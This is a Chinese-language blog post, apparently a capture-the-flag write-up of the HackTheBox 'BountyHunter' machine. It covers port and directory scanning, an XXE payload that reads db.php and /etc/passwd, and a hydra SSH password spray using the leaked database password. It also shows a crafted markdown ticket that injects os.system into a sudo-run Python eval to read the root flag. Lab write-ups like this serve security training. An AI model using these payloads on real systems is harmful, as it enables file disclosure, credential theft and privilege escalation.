<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>BountyHunter - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - BountyHunter靶场信息  靶场类型  信息搜集使用nmap进行端口扫描 ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.11.100 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-25 13:02 CST Nmap scan rep">
<meta property="og:type" content="article">
<meta property="og:title" content="BountyHunter - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - BountyHunter靶场信息  靶场类型  信息搜集使用nmap进行端口扫描 ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.11.100 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-25 13:02 CST Nmap scan rep">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/498c133a-fe2b-4ecc-857f-88db9ac41a1d.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/89afe67a-26ef-4502-8682-01d900757f3c.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/78dd4165-7463-4056-b3e9-23293d145873.png">
<meta property="article:published_time" content="2021-07-25T11:38:36.000Z">
<meta property="article:modified_time" content="2023-06-13T03:41:25.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/498c133a-fe2b-4ecc-857f-88db9ac41a1d.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/lucifiel" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                请我喝咖啡
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">BountyHunter - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">BountyHunter - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-07-25T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-07-25
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-BountyHunter"><span class="post-toc-text">Hackthebox - BountyHunter</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox/Easy/Hackthebox-BountyHunter"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">BountyHunter - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-07-25 19:38:36" datetime="2021-07-25T11:38:36.000Z"  itemprop="datePublished">2021-07-25</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-BountyHunter"><a href="#Hackthebox-BountyHunter" class="headerlink" title="Hackthebox - BountyHunter"></a>Hackthebox - BountyHunter</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2><img src="/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/498c133a-fe2b-4ecc-857f-88db9ac41a1d.png" class>

<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/89afe67a-26ef-4502-8682-01d900757f3c.png" class>

<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>使用nmap进行端口扫描</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# nmap -A -sS -sC -sV -p- 10.10.11.100
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-25 13:02 CST
Nmap scan report for 10.10.11.100
Host is up (0.25s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/25%OT=22%CT=1%CU=31546%PV=Y%DS=2%DC=T%G=Y%TM=60FCF27
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST1
OS:1NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   251.53 ms 10.10.14.1
2   251.65 ms 10.10.11.100

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 546.93 seconds
</code></pre>
<p>从扫描结果中，我们可以得到如下几个信息： - 本台靶机开启了<code>22</code>、<code>80</code>端口 - 本台80端口使用了Apache&#x2F;2.4.41作为HTTP服务</p>
<p>咱们去访问80端口看看内容。</p>
<img src="/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/78dd4165-7463-4056-b3e9-23293d145873.png" class>

<p>这好像是一个SRC平台？专业对口</p>
<p>发现了一个php文件</p>
<pre><code class="Plain">http://10.10.11.100/log_submit.php
</code></pre>
<p>简单测试了一下XSS，但是没有成功，先放着不管我们找找其他思路</p>
<p>先做一个FUZZ看看吧</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# gobuster dir -u http://10.10.11.100 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.100
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2021/07/25 13:24:30 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--&gt; http://10.10.11.100/assets/]
/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.11.100/css/]
/db.php               (Status: 200) [Size: 0]
/index.php            (Status: 200) [Size: 25169]
/index.php            (Status: 200) [Size: 25169]
/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.11.100/js/]
/portal.php           (Status: 200) [Size: 125]
/resources            (Status: 301) [Size: 316] [--&gt; http://10.10.11.100/resources/]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/07/25 13:32:25 Finished
===============================================================
</code></pre>
<p>咱们看看<code>/resources</code>目录</p>
<pre><code class="Plain">Index of /resources
[ICO]   Name    Last modified   Size    Description
[PARENTDIR] Parent Directory        -
[TXT]   README.txt  2021-04-06 00:01    210
[   ]   all.js  2021-04-05 17:37    1.1M
[   ]   bootstrap.bundle.min.js 2021-04-05 17:41    82K
[   ]   bootstrap_login.min.js  2021-04-05 17:08    48K
[   ]   bountylog.js    2021-06-15 15:47    594
[   ]   jquery.easing.min.js    2020-05-04 09:11    2.5K
[   ]   jquery.min.js   2020-05-04 16:01    87K
[   ]   jquery_login.min.js 2021-04-05 17:09    85K
[TXT]   lato.css    2021-04-05 17:39    2.6K
[TXT]   monsterat.css   2021-04-05 17:39    3.2K
Apache/2.4.41 (Ubuntu) Server at 10.10.11.100 Port 80
</code></pre>
<p>咱们挨个查看一下</p>
<p>在<code>README.txt</code>中发现了一个提示</p>
<pre><code class="Plain">Tasks:

[ ] Disable &#39;test&#39; account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
</code></pre>
<p>咱们把目光放在<code>/bountylog.js</code>这个文件上</p>
<pre><code class="Plain">function returnSecret(data) {
    return Promise.resolve($.ajax({
            type: &quot;POST&quot;,
            data: {&quot;data&quot;:data},
            url: &quot;tracker_diRbPr00f314.php&quot;
            }));
}

async function bountySubmit() {
    try {
        var xml = `&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
        &lt;bugreport&gt;
        &lt;title&gt;${$(&#39;#exploitTitle&#39;).val()}&lt;/title&gt;
        &lt;cwe&gt;${$(&#39;#cwe&#39;).val()}&lt;/cwe&gt;
        &lt;cvss&gt;${$(&#39;#cvss&#39;).val()}&lt;/cvss&gt;
        &lt;reward&gt;${$(&#39;#reward&#39;).val()}&lt;/reward&gt;
        &lt;/bugreport&gt;`
        let data = await returnSecret(btoa(xml));
        $(&quot;#return&quot;).html(data)
    }
    catch(error) {
        console.log(&#39;Error:&#39;, error);
    }
}
</code></pre>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>看到这里咱们梳理一下思路哈</p>
<ol>
<li><code>http://10.10.11.100/log_submit.php</code>中提示是一个提交窗口</li>
<li><code>http://10.10.11.100/resources/README.txt</code>中提示我们要写一个提交脚本到数据库，但我们目前并不知道要写什么脚本</li>
<li><code>http://10.10.11.100/resources/bountylog.js</code>中提示我们要编写一个XML脚本提交到<code>tracker_diRbPr00f314.php</code>，并且给出了我们脚本格式</li>
<li>我们访问<code>tracker_diRbPr00f314.php</code>后可以看到，内容就是<code>http://10.10.11.100/log_submit.php</code>提交后返回的内容</li>
</ol>
<p>平时我是不会写这么详细的，这里单纯是怼某个说我抄别人内容的杠精，给你看看我的解题思路，看看到底是抄的别人的还是我自己想的，实名制DISS你，不服随时来杠</p>
<p>然后咱们整理一下手上有的信息 1. 咱们手里有一个提交窗口<code>/log_submit.php</code> 2. 咱们有一个一看就很重要但没有内容的文件<code>/db.php</code> 3. 有一个XML注入的示例脚本</p>
<p>OK，目标很明确了，咱们使用XML注入去读取<code>/db.php</code>文件的内容即可</p>
<p>针对该目标编写脚本</p>
<pre><code class="Plain">var xml = `&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/html/db.php&quot;&gt; ]&gt;
        &lt;bugreport&gt;
        &lt;title&gt;&amp;xxe;&lt;/title&gt;
        &lt;cwe&gt;something&lt;/cwe&gt;
        &lt;cvss&gt;something&lt;/cvss&gt;
        &lt;reward&gt;something&lt;/reward&gt;
        &lt;/bugreport&gt;`
</code></pre>
<p>提交到控制台，然后使用</p>
<pre><code class="Plain">returnSecret(btoa(xml));
</code></pre>
<p>来进行读取</p>


<p>成功读取到该文件，咱们看看内容是什么</p>
<pre><code class="Plain">If DB were ready, would have added:
&lt;table&gt;
  &lt;tr&gt;
    &lt;td&gt;Title:&lt;/td&gt;
    &lt;td&gt;PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;CWE:&lt;/td&gt;
    &lt;td&gt;something&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Score:&lt;/td&gt;
    &lt;td&gt;something&lt;/td&gt;
  &lt;/tr&gt;
  &lt;tr&gt;
    &lt;td&gt;Reward:&lt;/td&gt;
    &lt;td&gt;something&lt;/td&gt;
  &lt;/tr&gt;
&lt;/table&gt;
</code></pre>
<p>看title返回的内容是一段base64码，咱们去解密试试</p>
<pre><code class="Plain">PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=

&lt;?php
// TODO -&gt; Implement login system with the database.
$dbserver = &quot;localhost&quot;;
$dbname = &quot;bounty&quot;;
$dbusername = &quot;admin&quot;;
$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;
$testuser = &quot;test&quot;;
?&gt;
</code></pre>
<p>咱们得到了数据库的账号密码，咱们读取<code>/etc/passwd</code>看看</p>
<pre><code class="Plain">var xml = `&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt; ]&gt;
        &lt;bugreport&gt;
        &lt;title&gt;&amp;xxe;&lt;/title&gt;
        &lt;cwe&gt;something&lt;/cwe&gt;
        &lt;cvss&gt;something&lt;/cvss&gt;
        &lt;reward&gt;something&lt;/reward&gt;
        &lt;/bugreport&gt;`
</code></pre>
<pre><code class="Plain">root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
</code></pre>
<p>似乎和我想的不一样啊，这里我们获取到的数据库用户名无法用来进行ssh登录，还得找找其他思路</p>
<p>咱们使用hydra进行爆破试试</p>
<p>首先将<code>/etc/passwd</code>的文件保存到本地</p>
<p>然后使用cut命令来提取用户名</p>
<pre><code class="Plain">cut -d : -f 1 passwd &gt; user
</code></pre>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# cat user
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-network
systemd-resolve
systemd-timesync
messagebus
syslog
_apt
tss
uuidd
tcpdump
landscape
pollinate
sshd
systemd-coredump
development
lxd
usbmux
</code></pre>
<p>现在就把所有的用户名都提取出来了</p>
<p>然后使用hydra进行爆破</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh                                                                                                                                                  255 ⨯
Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-25 14:42:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:34/p:1), ~3 tries per task
[DATA] attacking ssh://10.10.11.100:22/
[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K
[22][ssh] host: 10.10.11.100   login: development   password: m19RoAU0hP41A1sTsq6K
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-25 14:42:44
</code></pre>
<p>然后确定了账号密码</p>
<pre><code class="Plain">username = development
password = m19RoAU0hP41A1sTsq6K
</code></pre>
<p>咱们使用ssh进行登录</p>
<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
└─# ssh development@10.10.11.100
development@10.10.11.100&#39;s password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 25 Jul 2021 06:57:17 AM UTC

  System load:           0.0
  Usage of /:            24.3% of 6.83GB
  Memory usage:          15%
  Swap usage:            0%
  Processes:             216
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.100
  IPv6 address for eth0: dead:beef::250:56ff:feb9:7ae5

0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Jul 25 04:44:41 2021 from 10.10.14.17
development@bountyhunter:~$ whoami &amp;&amp; id
development
uid=1000(development) gid=1000(development) groups=1000(development)
</code></pre>
<p>成功getshell</p>
<pre><code class="Plain">development@bountyhunter:~$ cat user.txt
12df9cbc3e04ef498fad5cdd101563b4
</code></pre>
<p>成功拿到user权限的flag ## 权限提升 咱们使用sudo -l查看一下权限</p>
<pre><code class="Plain">development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
</code></pre>
<p>咱们可以利用<code>/usr/bin/python3.8</code>使用root权限无密码运行<code>/opt/skytrain_inc/ticketValidator.py</code>文件</p>
<p>咱们查看一下这个文件</p>
<pre><code class="Plain">development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(&quot;.md&quot;):
        return open(loc, &#39;r&#39;)
    else:
        print(&quot;Wrong file type.&quot;)
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith(&quot;# Skytrain Inc&quot;):
                return False
            continue
        if i == 1:
            if not x.startswith(&quot;## Ticket to &quot;):
                return False
            print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;)
            continue

        if x.startswith(&quot;__Ticket Code:__&quot;):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith(&quot;**&quot;):
                return False
            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))
                if validationNumber &gt; 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input(&quot;Please enter the path to the ticket file.\n&quot;)
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print(&quot;Valid ticket.&quot;)
    else:
        print(&quot;Invalid ticket.&quot;)
    ticket.close

main()
</code></pre>
<p>通过解读这个python脚本，我们得知，这个脚本要求我们输入文件名，且文件名要以<code>.md</code>为结尾。如果条件满足，则脚本打开文件并搜索下一个条件。</p>
<pre><code class="Plain">for i,x in enumerate(ticketFile.readlines()):

        if i == 0: # if line number 0 not startwith &quot;# Skytrain Inc&quot;, Quit, else Continue
            if not x.startswith(&quot;# Skytrain Inc&quot;):
                return False
            continue
        if i == 1: if line number 1 Exist and not startwith &quot;## Ticket to &quot; , Quit else Continue
            if not x.startswith(&quot;## Ticket to &quot;):
                return False
            print(f&quot;Destination: {&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])}&quot;)
            continue

    if x.startswith(&quot;__Ticket Code:__&quot;): # This is line number 2, as the previous statements are all returned out or continued to here. so line number 2 should be: &quot;__Ticket Code:__&quot;
            code_line = i+1
            continue

if code_line and i == code_line: # if code_line exist
            if not x.startswith(&quot;**&quot;): # if code_line not startwith **, Exit!
                return False
            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] # Remove ** from Code Line, and split at pos 0 where + is found. example is: **102+, would become just 102
            if int(ticketCode) % 7 == 4:  # the tricky part!
                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;)) # this is confusing! that is the catch, the code does not eval the splitted ticketCode, but actually the line itself just without any **. so you should just pass a line of code that would work.
</code></pre>
<p>那咱们编写一个<code>.md</code>文件让他满足条件即可</p>
<pre><code class="Plain"># Skytrain Inc
## Ticket to
__Ticket Code:__
**102+ 10 == 112 and __import__(&#39;os&#39;).system(&#39;cat /root/root.txt&#39;) == False
</code></pre>
<p>咱们运行一下</p>
<pre><code class="Plain">development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
lucifiel.md
Destination:
b320161d15bd03095cb66d05ac6d4ddf
Invalid ticket.
</code></pre>
<p>成功获得root权限的flag文件</p>

        </div>

        <blockquote class="post-copyright">
    
    <footer>
        <a href="http://www.lucifiel.com">
            <img src="/img/avatar.jpg" alt="Lucifiel">
            Lucifiel
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/07/25/Hackthebox/Easy/Hackthebox-BountyHunter/&title=《BountyHunter - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
